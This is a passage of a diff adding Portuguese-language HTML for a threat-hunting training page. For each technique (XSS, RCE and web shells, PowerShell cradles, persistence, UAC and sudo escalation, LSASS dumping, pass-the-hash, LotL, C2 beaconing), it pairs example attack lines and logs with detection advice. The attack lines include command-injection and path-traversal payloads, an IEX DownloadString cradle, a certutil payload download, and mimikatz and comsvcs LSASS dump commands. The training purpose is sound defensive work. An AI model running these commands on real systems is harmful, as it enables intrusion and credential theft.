+      <div class="stage log"><div class="sh">O LOG</div>
+        <div class="term"><div class="term-bar"><i></i><i></i><i></i><span>access.log</span></div>
+<pre>"GET /busca?q=<span class="r">%3Cscript%3Efetch</span>(...)%3C%2Fscript%3E"
+<span class="c">  %3C = '&lt;'  ·  %3E = '&gt;'  → tag script disfarçada</span></pre></div>
+      </div>
+      <div class="stage read"><div class="sh">COMO INTERPRETAR</div>
+        <p>Procure <code style="font-family:var(--mono);color:var(--red)">&lt;script&gt;</code>, <code style="font-family:var(--mono);color:var(--red)">onerror=</code>, <code style="font-family:var(--mono);color:var(--red)">onload=</code>, <code style="font-family:var(--mono);color:var(--red)">javascript:</code> em qualquer parâmetro. Em XSS armazenado (o mais perigoso), o payload chega num <code style="font-family:var(--mono)">POST</code> e depois é servido a todo mundo — cuidado redobrado em campos de comentário/perfil.</p>
+      </div>
+      <div class="stage det"><div class="sh">A CAÇA</div>
+        <p>Regex de tags/handlers de evento nos parâmetros. Bônus: <strong>Content-Security-Policy</strong> bem feita transforma XSS de "rouba tudo" em "não executa nada" — defesa que reduz o impacto mesmo se a injeção passar.</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-head"><div class="t"><span class="mi">T1190 · T1505.003</span><h3>RCE, Path Traversal & Web Shell</h3></div><div style="display:flex;gap:10px;align-items:center"><span class="sev crit">CRÍTICO</span><span class="chev">▶</span></div></div>
+    <div class="card-body">
+      <div class="stage atk"><div class="sh">O ATAQUE</div>
+        <p>Executar comando no servidor (RCE), ler arquivos fora da pasta (traversal) ou plantar um <strong>web shell</strong> — um arquivo que vira um terminal remoto via navegador.</p>
+        <div class="term"><div class="term-bar"><i></i><i></i><i></i><span>payloads</span></div>
+<pre><span class="c"># command injection</span>
+?host=<span class="r">8.8.8.8;cat /etc/passwd</span>
+<span class="c"># path traversal</span>
+?file=<span class="r">../../../../etc/passwd</span>
+<span class="c"># web shell plantado</span>
+GET /uploads/<span class="r">shell.php?cmd=whoami</span></pre></div>
+      </div>
+      <div class="stage log"><div class="sh">O LOG + sinal de host</div>
+        <div class="term"><div class="term-bar"><i></i><i></i><i></i><span>access.log + processo</span></div>
+<pre><span class="c"># no access.log:</span>
+"GET /img/<mark>shell.php</mark>?cmd=<span class="r">whoami</span>" <span class="a">200</span>
+<span class="c"># no host (auditd): o WEBSERVER virou pai de um shell!</span>
+ppid=<span class="a">www-data:nginx</span>  cmd=<mark class="g">/bin/sh -c whoami</mark></pre></div>
+      </div>
+      <div class="stage read"><div class="sh">COMO INTERPRETAR</div>
+        <p>O tesouro está na <strong>árvore de processos</strong>: um servidor web (nginx, apache, <code style="font-family:var(--mono)">www-data</code>) <em>nunca</em> deveria executar <code style="font-family:var(--mono)">/bin/sh</code>, <code style="font-family:var(--mono)">bash</code>, <code style="font-family:var(--mono)">whoami</code>, <code style="font-family:var(--mono)">id</code>, <code style="font-family:var(--mono)">curl</code>. Quando ele faz isso, há web shell ou RCE ativo. <code style="font-family:var(--mono)">../</code> repetido = traversal tentando sair da raiz web.</p>
+      </div>
+      <div class="stage det"><div class="sh">A CAÇA</div>
+        <p><strong>Detecção pela relação proibida:</strong> alerta sempre que o usuário do webserver gerar um processo shell. Pega RCE de qualquer CVE, qualquer web shell, qualquer linguagem. Complementa com: arquivos novos <code style="font-family:var(--mono)">.php/.jsp/.aspx</code> em pastas de upload, e requisições a esses arquivos logo após o upload.</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="quiz">
+    <div class="q"><span class="qi">QUIZ</span> No log do host, você vê que o processo <code style="font-family:var(--mono);color:var(--sig)">www-data</code> (nginx) é o <em>pai</em> de um <code style="font-family:var(--mono);color:var(--sig)">/bin/bash</code> rodando <code>whoami</code>. O que é mais provável?</div>
+    <button class="opt" data-c="0">Manutenção normal do servidor <span class="res"></span></button>
+    <button class="opt" data-c="1">RCE / web shell ativo — webserver não gera shell sozinho <span class="res"></span></button>
+    <button class="opt" data-c="0">Atualização do sistema operacional <span class="res"></span></button>
+    <button class="opt" data-c="0">Backup agendado <span class="res"></span></button>
+    <div class="exp"><b>Web shell / RCE.</b> A relação pai→filho proibida (processo do webserver gerando interpretador de comando) é um dos sinais de maior confiança em toda a detecção. Não importa qual CVE foi usada — o comportamento denuncia. Este é o poder de detectar no topo da Pirâmide da Dor.</div>
+  </div>
+</section>
+
+<div class="hr"></div>
+
+<!-- ============ EXECUTION ============ -->
+<section id="execution" class="reveal">
+  <div class="eyebrow"><span class="num">09 /</span> CATÁLOGO · EXECUÇÃO</div>
+  <h2 class="sec">Execução & Payloads</h2>
+  <p class="sec-sub">Já dentro, o atacante precisa <em>rodar código</em>. PowerShell, cmd, WMI, scripts. A boa notícia: executar código gera o evento mais rico de todos — a <strong>criação de processo com linha de comando</strong> (4688 / Sysmon 1). Domine esse evento e você vê metade dos ataques.</p>
+
+  <div class="feynman">
+    <div class="lbl">EXPLICANDO PARA UMA CRIANÇA</div>
+    <p>Toda vez que um programa abre, é como uma criança nova entrando na sala — e o porteiro anota num caderninho: <span class="em">quem entrou, quem mandou entrar (o "pai"), e o que ela falou ao entrar (a "linha de comando")</span>.</p>
+    <p>Os ataques quase sempre fazem programas <span class="em">falarem coisas estranhas ao entrar</span> — palavras escondidas, comandos em código secreto. Se você lê o caderninho, você ouve o que cada programa "disse". <b>É aí que o disfarce escorrega.</b></p>
+  </div>
+
+  <table class="tbl">
+    <tr><th>Pista na linha de comando</th><th>Por que é suspeito</th></tr>
+    <tr><td class="r"><code>-enc / -EncodedCommand</code></td><td>Comando em Base64 para esconder o texto</td></tr>
+    <tr><td class="r"><code>-w hidden / -WindowStyle Hidden</code></td><td>Roda sem janela, invisível ao usuário</td></tr>
+    <tr><td class="r"><code>-nop / -ExecutionPolicy Bypass</code></td><td>Desliga proteções do PowerShell</td></tr>
+    <tr><td class="r"><code>IEX / Invoke-Expression</code></td><td>Executa texto baixado da internet</td></tr>
+    <tr><td class="r"><code>DownloadString / DownloadFile</code></td><td>Baixa payload de fora</td></tr>
+    <tr><td class="r"><code>FromBase64String</code></td><td>Decodifica payload embutido</td></tr>
+    <tr><td class="r"><code>-c / -Command "$(...)"</code> aninhado</td><td>Ofuscação por concatenação</td></tr>
+  </table>
+
+  <div class="note tip"><span class="ni">▸</span><div><b>Habilite PowerShell ScriptBlock Logging (Event 4104).</b> Ele registra o comando <em>já desofuscado</em>, mesmo que tenha entrado em Base64. É como o atacante escrever em código secreto e o sistema gravar a tradução automaticamente. Sem isso, você caça às cegas.</div></div>
+
+  <div class="card">
+    <div class="card-head"><div class="t"><span class="mi">T1059.001</span><h3>PowerShell ofuscado (cradle de download)</h3></div><div style="display:flex;gap:10px;align-items:center"><span class="sev crit">CRÍTICO</span><span class="chev">▶</span></div></div>
+    <div class="card-body">
+      <div class="stage log"><div class="sh">O LOG (4104 — já traduzido)</div>
+        <div class="term"><div class="term-bar"><i></i><i></i><i></i><span>PowerShell Operational · 4104</span></div>
+<pre>ScriptBlock:
+  <span class="r">IEX</span> (<span class="k">New-Object</span> Net.WebClient).<span class="r">DownloadString</span>(
+     <span class="s">'http://185.x.x.x/a.ps1'</span>)
+  <span class="c"># traduzido do -enc automaticamente pelo log</span></pre></div>
+      </div>
+      <div class="stage read"><div class="sh">COMO INTERPRETAR</div>
+        <p>Esse trio — <code style="font-family:var(--mono)">IEX</code> + <code style="font-family:var(--mono)">WebClient</code> + <code style="font-family:var(--mono)">DownloadString</code> de uma URL crua com IP — é o "cradle" de download, padrão da indústria do malware. Significa: "baixe um script da internet e execute na memória sem tocar o disco". Memória = foge de antivírus de arquivo.</p>
+      </div>
+      <div class="stage det"><div class="sh">A CAÇA</div>
+        <p>Procure por <code style="font-family:var(--mono)">DownloadString</code>/<code style="font-family:var(--mono)">DownloadFile</code>/<code style="font-family:var(--mono)">IEX</code> em 4104; conte tamanho/entropia da linha de comando (comando gigante e aleatório = ofuscação); e correlacione com Event 3 (conexão de rede do powershell para fora).</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<div class="hr"></div>
+
+<!-- ============ PERSISTENCE ============ -->
+<section id="persistence" class="reveal">
+  <div class="eyebrow"><span class="num">10 /</span> CATÁLOGO · PERSISTÊNCIA</div>
+  <h2 class="sec">Persistência — fincando o pé</h2>
+  <p class="sec-sub">O atacante quer continuar dentro mesmo depois de você reiniciar a máquina. Ele planta "âncoras": chaves de registro, tarefas agendadas, serviços, cron. A defesa é conhecer os <em>poucos lugares</em> de onde coisas iniciam sozinhas — e vigiar mudanças neles.</p>
+
+  <div class="feynman">
+    <div class="lbl">EXPLICANDO PARA UMA CRIANÇA</div>
+    <p>Imagina que o ladrão entrou e quer poder voltar quando quiser. Então ele <span class="em">esconde uma cópia da chave</span> debaixo do tapete. Aí mesmo que você tranque a porta, ele volta amanhã pela mesma chave.</p>
+    <p>No computador, "debaixo do tapete" são uns <span class="em">poucos lugares fixos</span> de onde o sistema lê "o que abrir quando ligar". O ladrão põe o programa dele lá. <b>Você só precisa checar esses tapetes específicos toda vez — não a casa inteira.</b></p>
+  </div>
+
+  <table class="tbl">
+    <tr><th>Onde plantam (Windows)</th><th>Evento</th><th>Código ATT&CK</th></tr>
+    <tr><td>Run / RunOnce (registro)</td><td>Sysmon 13</td><td><code>T1547.001</code></td></tr>
+    <tr><td>Scheduled Task (schtasks)</td><td>4698 / Sysmon 1</td><td><code>T1053.005</code></td></tr>
+    <tr><td>New Service</td><td>7045 / 4697</td><td><code>T1543.003</code></td></tr>
+    <tr><td>WMI Event Subscription</td><td>Sysmon 19/20/21</td><td><code>T1546.003</code></td></tr>
+    <tr><td>Startup Folder</td><td>Sysmon 11</td><td><code>T1547.001</code></td></tr>
+  </table>
+  <table class="tbl">
+    <tr><th>Onde plantam (Linux)</th><th>Onde olhar</th><th>Código</th></tr>
+    <tr><td>cron / crontab</td><td><code>/etc/cron*</code>, <code>crontab -l</code></td><td><code>T1053.003</code></td></tr>
+    <tr><td>systemd service/timer</td><td><code>/etc/systemd/system/</code></td><td><code>T1543.002</code></td></tr>
+    <tr><td>~/.bashrc, /etc/profile.d</td><td>perfis de shell</td><td><code>T1546.004</code></td></tr>
+    <tr><td>chave SSH plantada</td><td><code>~/.ssh/authorized_keys</code></td><td><code>T1098.004</code></td></tr>
+  </table>
+
+  <div class="card">
+    <div class="card-head"><div class="t"><span class="mi">T1547.001</span><h3>Registry Run Key</h3></div><div style="display:flex;gap:10px;align-items:center"><span class="sev high">HIGH</span><span class="chev">▶</span></div></div>
+    <div class="card-body">
+      <div class="stage log"><div class="sh">O LOG (Sysmon 13 — alteração de registro)</div>
+        <div class="term"><div class="term-bar"><i></i><i></i><i></i><span>Sysmon · EventID 13</span></div>
+<pre><span class="b">EventType:</span>      SetValue
+<span class="b">TargetObject:</span>   HKCU\...\<mark>Run\Updater</mark>
+<span class="b">Details:</span>        <mark>C:\Users\joao\AppData\Roaming\svchost.exe</mark>
+<span class="c">                ↑ nome "svchost" mas em pasta de usuário = falso!</span></pre></div>
+      </div>
+      <div class="stage read"><div class="sh">COMO INTERPRETAR</div>
+        <p>Duas pistas: <strong>(1)</strong> escrita numa chave Run (autostart); <strong>(2)</strong> o executável tem nome de sistema (<code style="font-family:var(--mono)">svchost.exe</code>) mas mora em <code style="font-family:var(--mono)">AppData\Roaming</code> — o real fica em <code style="font-family:var(--mono)">C:\Windows\System32</code>. <strong>Nome de sistema em caminho de usuário é mascaramento (T1036).</strong> Decore os caminhos legítimos dos binários de sistema.</p>
+      </div>
+      <div class="stage det"><div class="sh">A CAÇA</div>
+        <p>Alerte em SetValue nas chaves Run quando o valor apontar para <code style="font-family:var(--mono)">AppData</code>, <code style="font-family:var(--mono)">Temp</code>, <code style="font-family:var(--mono)">ProgramData</code> ou caminho não assinado. E compare nomes de processo contra a lista de binários de sistema esperados — <code style="font-family:var(--mono)">svchost</code>/<code style="font-family:var(--mono)">lsass</code>/<code style="font-family:var(--mono)">services</code> fora de System32 = bandeira vermelha.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<div class="hr"></div>
+
+<!-- ============ PRIVESC ============ -->
+<section id="privesc" class="reveal">
+  <div class="eyebrow"><span class="num">11 /</span> CATÁLOGO · ESCALAÇÃO</div>
+  <h2 class="sec">Escalação de Privilégio</h2>
+  <p class="sec-sub">Entrou como usuário comum, quer virar administrador/root. Bypass de UAC, abuso de sudo, tokens, kernel exploits. A detecção mira na <em>transição</em>: a mesma conta que era limitada de repente faz coisas de admin.</p>
+
+  <div class="feynman">
+    <div class="lbl">EXPLICANDO PARA UMA CRIANÇA</div>
+    <p>Você entrou na escola como aluno. Mas você quer a chave que só a <span class="em">diretora</span> tem. Então você acha um truque: talvez uma porta dos fundos, talvez se passar pela diretora por um instante.</p>
+    <p>O flagrante é quando <span class="em">o aluno de repente está mexendo nas coisas da diretora</span>. A pessoa é a mesma, mas o poder mudou — e isso deixa rastro. <b>Vigie quem "subiu de cargo" sem passar pelo caminho normal.</b></p>
+  </div>
+
+  <div class="card">
+    <div class="card-head"><div class="t"><span class="mi">T1548.002</span><h3>UAC Bypass (fodhelper/eventvwr)</h3></div><div style="display:flex;gap:10px;align-items:center"><span class="sev high">HIGH</span><span class="chev">▶</span></div></div>
+    <div class="card-body">
+      <div class="stage atk"><div class="sh">O ATAQUE</div>
+        <p>Abusar de binários do Windows que auto-elevam para rodar código como admin sem o prompt do UAC, plantando comando numa chave de registro que esses binários leem.</p>
+      </div>
+      <div class="stage log"><div class="sh">O LOG</div>
+        <div class="term"><div class="term-bar"><i></i><i></i><i></i><span>Sysmon 13 + 1</span></div>
+<pre><span class="c"># 1) escrita na chave que fodhelper lê:</span>
+13 TargetObject: HKCU\Software\Classes\<mark>ms-settings\shell
+\open\command</mark>  Details: <span class="r">cmd /c payload.exe</span>
+<span class="c"># 2) fodhelper roda elevado e dispara o payload:</span>
+1  ParentImage: <mark>fodhelper.exe</mark>  Image: <span class="r">cmd.exe</span>
+   IntegrityLevel: <span class="r">High</span>   <span class="c">← virou admin!</span></pre></div>
+      </div>
+      <div class="stage read"><div class="sh">COMO INTERPRETAR</div>
+        <p>A combinação é assinatura: escrita naquela chave específica de <code style="font-family:var(--mono)">ms-settings</code> (ninguém legítimo escreve ali) seguida de <code style="font-family:var(--mono)">fodhelper.exe</code> gerando um shell com <code style="font-family:var(--mono)">IntegrityLevel: High</code>. O salto de integridade Medium→High sem prompt de UAC é a evidência da elevação.</p>
+      </div>
+      <div class="stage det"><div class="sh">A CAÇA</div>
+        <p>Monitore essas chaves "mágicas" (<code style="font-family:var(--mono)">ms-settings\shell\open\command</code>, <code style="font-family:var(--mono)">mscfile\shell\open\command</code>). Alerte quando auto-elevadores (<code style="font-family:var(--mono)">fodhelper</code>, <code style="font-family:var(--mono)">eventvwr</code>, <code style="font-family:var(--mono)">sdclt</code>, <code style="font-family:var(--mono)">computerdefaults</code>) forem pais de cmd/powershell.</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-head"><div class="t"><span class="mi">T1548.003 · T1068</span><h3>Linux: sudo / SUID / kernel</h3></div><div style="display:flex;gap:10px;align-items:center"><span class="sev high">HIGH</span><span class="chev">▶</span></div></div>
+    <div class="card-body">
+      <div class="stage log"><div class="sh">O LOG (auditd)</div>
+        <div class="term"><div class="term-bar"><i></i><i></i><i></i><span>/var/log/auth.log + auditd</span></div>
+<pre><span class="c"># abuso de GTFOBin via sudo:</span>
+sudo: joao : TTY=pts/0 ; <span class="r">COMMAND=/usr/bin/find . -exec /bin/sh \;</span>
+<span class="c"># find rodando como root vira shell root — clássico GTFOBins</span>
+
+<span class="c"># execução de SUID estranho:</span>
+type=EXECVE <span class="r">exe="/tmp/.x" euid=0</span>  <span class="c">← binário em /tmp como root</span></pre></div>
+      </div>
+      <div class="stage read"><div class="sh">COMO INTERPRETAR</div>
+        <p><code style="font-family:var(--mono)">find ... -exec /bin/sh</code> via sudo é um <strong>GTFOBin</strong>: ferramenta legítima abusada para virar shell root. Execução com <code style="font-family:var(--mono)">euid=0</code> de binário em <code style="font-family:var(--mono)">/tmp</code> ou <code style="font-family:var(--mono)">/dev/shm</code> é altamente suspeita — root não roda coisas de pastas mundo-graváveis.</p>
+      </div>
+      <div class="stage det"><div class="sh">A CAÇA</div>
+        <p>Alerte sudo executando interpretadores/utilitários com flag <code style="font-family:var(--mono)">-exec</code>; execuções com <code style="font-family:var(--mono)">euid=0</code> a partir de <code style="font-family:var(--mono)">/tmp /var/tmp /dev/shm</code>; e criação de novos binários SUID (mudança de permissão para SUID = T1548.001).</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<div class="hr"></div>
+
+<!-- ============ LATERAL ============ -->
+<section id="lateral" class="reveal">
+  <div class="eyebrow"><span class="num">12 /</span> CATÁLOGO · MOVIMENTO LATERAL</div>
+  <h2 class="sec">Movimento Lateral & Roubo de Credencial</h2>
+  <p class="sec-sub">Uma máquina invadida raramente é o alvo final. O atacante "anda de lado" pela rede: rouba credenciais de uma, usa para entrar na próxima, até chegar ao controlador de domínio. Detectar aqui evita o desastre total.</p>
+
+  <div class="feynman">
+    <div class="lbl">EXPLICANDO PARA UMA CRIANÇA</div>
+    <p>O ladrão entrou na casa do vizinho, achou um <span class="em">molho de chaves</span> e descobriu que uma delas abre a SUA casa também (porque o condomínio usa chaves parecidas). Aí ele vai pulando de casa em casa usando as chaves que encontra em cada uma.</p>
+    <p>O sinal? <span class="em">A mesma pessoa abrindo várias casas diferentes numa noite</span>, e às vezes usando a chave sem nem ter a chave original — só uma "cópia mágica" (o hash da senha). <b>Vigie contas que de repente acessam muitas máquinas que nunca tocaram antes.</b></p>
+  </div>
+
+  <div class="card">
+    <div class="card-head"><div class="t"><span class="mi">T1003.001</span><h3>Dump do LSASS (roubo de credenciais)</h3></div><div style="display:flex;gap:10px;align-items:center"><span class="sev crit">CRÍTICO</span><span class="chev">▶</span></div></div>
+    <div class="card-body">
+      <div class="stage atk"><div class="sh">O ATAQUE</div>
+        <p>O processo <code style="font-family:var(--mono)">lsass.exe</code> guarda senhas/hashes na memória. Dump dele (Mimikatz, comsvcs.dll, Task Manager) = colher todas as credenciais da máquina.</p>
+        <div class="term"><div class="term-bar"><i></i><i></i><i></i><span>técnicas comuns</span></div>
+<pre><span class="r">mimikatz</span> sekurlsa::logonpasswords
+<span class="c"># LOLBin: dump via biblioteca legítima do Windows</span>
+rundll32 <span class="r">comsvcs.dll, MiniDump</span> &lt;pid_lsass&gt; lsass.dmp full</pre></div>
+      </div>
+      <div class="stage log"><div class="sh">O LOG (Sysmon 10 — ProcessAccess)</div>
+        <div class="term"><div class="term-bar"><i></i><i></i><i></i><span>Sysmon · EventID 10</span></div>
+<pre><span class="b">SourceImage:</span>  C:\...\<mark>rundll32.exe</mark>   <span class="c">← quem acessou</span>
+<span class="b">TargetImage:</span>  C:\Windows\System32\<mark>lsass.exe</mark>  <span class="c">← o cofre</span>
+<span class="b">GrantedAccess:</span> <span class="r">0x1410 / 0x1010</span>  <span class="c">← acesso de leitura de memória</span>
+<span class="b">CallTrace:</span>    ...<span class="r">comsvcs.dll</span>...</pre></div>
+      </div>
+      <div class="stage read"><div class="sh">COMO INTERPRETAR</div>
+        <p>Quase <em>nada</em> legítimo abre o LSASS para leitura de memória com esses acessos. Os valores <code style="font-family:var(--mono)">GrantedAccess</code> como <code style="font-family:var(--mono)">0x1410</code>/<code style="font-family:var(--mono)">0x1010</code> indicam <code style="font-family:var(--mono)">VM_READ</code> — leitura da memória do cofre. <code style="font-family:var(--mono)">comsvcs.dll</code> no CallTrace = técnica de minidump via LOLBin.</p>
+      </div>
+      <div class="stage det"><div class="sh">A CAÇA</div>
+        <p>Regra de altíssimo valor: <strong>qualquer processo que não seja a curtíssima allowlist (alguns componentes de AV/EDR) acessando lsass.exe com VM_READ</strong>. Some criação de arquivo <code style="font-family:var(--mono)">.dmp</code> + <code style="font-family:var(--mono)">rundll32 comsvcs</code>. Habilite também <strong>Credential Guard</strong> para tornar o dump inútil.</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-head"><div class="t"><span class="mi">T1021.002 / T1550.002</span><h3>Pass-the-Hash & SMB lateral</h3></div><div style="display:flex;gap:10px;align-items:center"><span class="sev crit">CRÍTICO</span><span class="chev">▶</span></div></div>
+    <div class="card-body">
+      <div class="stage atk"><div class="sh">O ATAQUE</div>
+        <p>Usar o <em>hash</em> da senha (sem saber a senha em texto) para autenticar em outra máquina via SMB/WMI. Ferramentas: <code style="font-family:var(--mono)">psexec</code>, <code style="font-family:var(--mono)">wmiexec</code>, <code style="font-family:var(--mono)">smbexec</code>.</p>
+      </div>
+      <div class="stage log"><div class="sh">O LOG (4624 tipo 3 + 5140 + serviço)</div>
+        <div class="term"><div class="term-bar"><i></i><i></i><i></i><span>Windows Security (host destino)</span></div>
+<pre>4624 LogonType=<span class="a">3</span> User=<mark>admin</mark> Src=<mark>WS-JOAO</mark>
+   <span class="b">AuthPackage:</span> NTLM   <span class="c">← NTLM em rede interna = suspeito</span>
+5140 Share=<mark>ADMIN$</mark>   <span class="c">← acesso a share administrativo</span>
+7045 NovoServico=<mark>PSEXESVC</mark>  <span class="c">← assinatura do psexec</span>
+4688 cmd.exe via servico recem-criado  <span class="r">← execução remota</span></pre></div>
+      </div>
+      <div class="stage read"><div class="sh">COMO INTERPRETAR</div>
+        <p>A cadeia conta a história: logon tipo 3 com <strong>NTLM</strong> (numa rede que deveria usar Kerberos) + acesso a <code style="font-family:var(--mono)">ADMIN$</code>/<code style="font-family:var(--mono)">C$</code> + criação de serviço com nome de ferramenta (<code style="font-family:var(--mono)">PSEXESVC</code>) + execução. <strong>Cada evento é fraco sozinho; a sequência é forte.</strong> Lateral movement só aparece quando você <em>correlaciona</em> em vez de olhar eventos isolados.</p>
+      </div>
+      <div class="stage det"><div class="sh">A CAÇA</div>
+        <p>Conte <strong>máquinas-destino distintas por conta numa janela curta</strong> (uma conta que toca 8 hosts em 10 min = anômalo). Alerte serviços criados com binários em <code style="font-family:var(--mono)">ADMIN$</code>, NTLM onde só deveria existir Kerberos, e nomes de serviço aleatórios. <strong>Detecção pela ausência:</strong> contas de serviço têm padrão fixo — quando uma delas começa a se mover lateralmente, a quebra do padrão denuncia.</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="note osint"><span class="ni">✶</span><div><b>Inovação — Kerberoasting & detecção de ouro:</b> atacantes pedem tickets de serviço (TGS) para quebrar senhas offline (T1558.003). O sinal é o <b>Event 4769</b> com cifra fraca (<code style="font-family:var(--mono)">RC4 / 0x17</code>) sendo pedido em volume para muitos SPNs por uma conta. Plante <b>contas-isca (honey accounts)</b> com SPN: ninguém legítimo pede ticket delas, então <em>qualquer</em> 4769 para a isca é um atacante 100% confirmado. Honeytokens transformam ruído em certeza.</div></div>
+</section>
+
+<div class="hr"></div>
+
+<!-- ============ LOTL ============ -->
+<section id="lotl" class="reveal">
+  <div class="eyebrow"><span class="num">13 /</span> CATÁLOGO · EVASÃO</div>
+  <h2 class="sec">Living-off-the-Land (LotL) & Fileless</h2>
+  <p class="sec-sub">A técnica dos adversários mais avançados (incluindo APTs como Volt Typhoon): <strong>não trazer malware nenhum</strong>. Usar só ferramentas que já vêm no Windows/Linux. Sem arquivo malicioso = antivírus não tem o que pegar. Aqui a detecção comportamental é a <em>única</em> defesa.</p>
+
+  <div class="feynman">
+    <div class="lbl">EXPLICANDO PARA UMA CRIANÇA</div>
+    <p>O ladrão mais esperto não traz ferramentas próprias (que poderiam ser achadas na revista). Ele usa as <span class="em">ferramentas que já estão na sua casa</span>: sua faca, sua escada, seu martelo. Assim, se alguém revistar a mochila dele, não acha nada de errado — tudo que ele usou é seu.</p>
+    <p>No computador, são programas normais do Windows (<span class="em">certutil, mshta, rundll32, bitsadmin</span>) usados de um jeito torto. <b>Você não pode proibir a faca da cozinha — mas pode estranhar a faca sendo usada para arrombar a janela.</b> Detecta-se o <em>uso anormal</em>, não a ferramenta.</p>
+  </div>
+
+  <table class="tbl">
+    <tr><th>LOLBin</th><th>Uso legítimo</th><th>Abuso pelo atacante</th></tr>
+    <tr><td class="r"><code>certutil</code></td><td>Gerenciar certificados</td><td>Baixar arquivo / decodificar Base64</td></tr>
+    <tr><td class="r"><code>mshta</code></td><td>Rodar apps HTML</td><td>Executar script remoto malicioso</td></tr>
+    <tr><td class="r"><code>rundll32</code></td><td>Rodar DLLs do sistema</td><td>Executar código arbitrário / dump LSASS</td></tr>
+    <tr><td class="r"><code>regsvr32</code></td><td>Registrar DLLs</td><td>Squiblydoo: rodar script remoto (.sct)</td></tr>
+    <tr><td class="r"><code>bitsadmin</code></td><td>Transferência de update</td><td>Download furtivo de payload</td></tr>
+    <tr><td class="r"><code>wmic</code></td><td>Administração WMI</td><td>Execução remota / persistência</td></tr>
+    <tr><td class="r"><code>msbuild</code></td><td>Compilar projetos</td><td>Compilar e rodar payload inline</td></tr>
+  </table>
+
+  <div class="card">
+    <div class="card-head"><div class="t"><span class="mi">T1105 · T1140</span><h3>certutil como downloader</h3></div><div style="display:flex;gap:10px;align-items:center"><span class="sev high">HIGH</span><span class="chev">▶</span></div></div>
+    <div class="card-body">
+      <div class="stage log"><div class="sh">O LOG</div>
+        <div class="term"><div class="term-bar"><i></i><i></i><i></i><span>Sysmon 1 / 4688</span></div>
+<pre>Image: certutil.exe
+CommandLine: certutil <span class="r">-urlcache -split -f</span>
+   <span class="s">http://185.x.x.x/payload.exe</span> C:\Users\Public\<mark>p.exe</mark>
+<span class="c">  ↑ certutil "gerencia certificados" — não baixa .exe da web!</span></pre></div>
+      </div>
+      <div class="stage read"><div class="sh">COMO INTERPRETAR</div>
+        <p>As flags <code style="font-family:var(--mono)">-urlcache -split -f</code> + uma URL é certutil sendo usado como <code style="font-family:var(--mono)">wget</code>. Uso 100% fora do propósito da ferramenta. <strong>O nome do processo é inocente; os argumentos denunciam.</strong> Por isso a linha de comando é tão valiosa — sem ela, certutil parece atividade normal.</p>
+      </div>
+      <div class="stage det"><div class="sh">A CAÇA</div>
+        <p>Construa uma allowlist de <em>como</em> cada LOLBin é usado legitimamente no seu ambiente; alerte no resto. Exemplos prontos: <code style="font-family:var(--mono)">certutil</code> com URL; <code style="font-family:var(--mono)">regsvr32</code> com <code style="font-family:var(--mono)">/i:http</code> e <code style="font-family:var(--mono)">scrobj.dll</code>; <code style="font-family:var(--mono)">mshta</code> com <code style="font-family:var(--mono)">http</code>/<code style="font-family:var(--mono)">javascript:</code>; <code style="font-family:var(--mono)">rundll32</code> sem DLL+função canônica.</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="note tip"><span class="ni">▸</span><div><b>O projeto LOLBAS</b> (lolbas-project.github.io) cataloga todos os binários do Windows abusáveis e exatamente como. É a sua "lista de ferramentas da casa que podem arrombar a janela". O equivalente Linux é o <b>GTFOBins</b>. Use ambos como fonte para escrever detecções de uso anômalo.</div></div>
+</section>
+
+<div class="hr"></div>
+
+<!-- ============ EXFIL / C2 ============ -->
+<section id="exfil" class="reveal">
+  <div class="eyebrow"><span class="num">14 /</span> CATÁLOGO · C2 & EXFILTRAÇÃO</div>
+  <h2 class="sec">Command & Control e Exfiltração</h2>
+  <p class="sec-sub">Depois de dentro, o atacante "telefona para casa" (C2) para receber ordens, e depois <em>rouba os dados</em> (exfil). Ambos acontecem na rede — e a rede tem um ritmo. Quem entende o ritmo normal escuta a batida estranha do beacon.</p>
+
+  <div class="feynman">
+    <div class="lbl">EXPLICANDO PARA UMA CRIANÇA</div>
+    <p>O ladrão deixou um <span class="em">walkie-talkie escondido</span> dentro da casa. A cada minuto, certinho, ele aperta o botão e pergunta: <em>"alguma ordem nova, chefe?"</em>. Esse "bip... bip... bip" perfeitamente regular não é como gente conversa — gente fala em horas aleatórias.</p>
+    <p>Essa regularidade robótica é o <span class="em">"beacon"</span>. E quando o ladrão finalmente leva as coisas, ele faz <span class="em">um monte de viagens grandes para fora</span> — muita coisa saindo de uma vez. <b>Vigie o computador que "telefona" em intervalos perfeitos e o que de repente manda muito dado para fora.</b></p>
+  </div>
+
+  <div class="card">
+    <div class="card-head"><div class="t"><span class="mi">T1071 · T1571</span><h3>Beaconing C2 (HTTP/HTTPS)</h3></div><div style="display:flex;gap:10px;align-items:center"><span class="sev crit">CRÍTICO</span><span class="chev">▶</span></div></div>
+    <div class="card-body">
+      <div class="stage log"><div class="sh">O LOG (proxy / Zeek)</div>
+        <div class="term"><div class="term-bar"><i></i><i></i><i></i><span>proxy.log — note os intervalos</span></div>
+<pre>10:00:03  10.0.0.5 → <mark>cdn-update-asia.xyz</mark>  GET /j  204
+10:01:04  10.0.0.5 → <mark>cdn-update-asia.xyz</mark>  GET /j  204
+10:02:02  10.0.0.5 → <mark>cdn-update-asia.xyz</mark>  GET /j  204
+10:03:05  10.0.0.5 → <mark>cdn-update-asia.xyz</mark>  GET /j  204
+<span class="c">  ↑ ~60s ± poucos seg (jitter), mesmo destino, resposta vazia</span></pre></div>
+      </div>
+      <div class="stage read"><div class="sh">COMO INTERPRETAR</div>
+        <p>Três marcas do beacon: <strong>(1) periodicidade</strong> (intervalo quase constante, com pequeno "jitter" aleatório); <strong>(2) baixa variância de tamanho</strong> (requisições iguaizinhas); <strong>(3) destino raro/recém-criado</strong>, geralmente fora do horário e sem referer. Conexões humanas são irregulares e variadas. Robôs são metronômicos.</p>
+      </div>
+      <div class="stage det"><div class="sh">A CAÇA</div>
+        <p>Calcule o <strong>desvio padrão dos intervalos</strong> entre conexões de um host para um destino. Baixo desvio + muitas conexões = beacon.</p>
+        <div class="term"><div class="term-bar"><i></i><i></i><i></i><span>detect_beacon.py</span></div>
+<pre><span class="k">import</span> statistics <span class="k">as</span> st
+
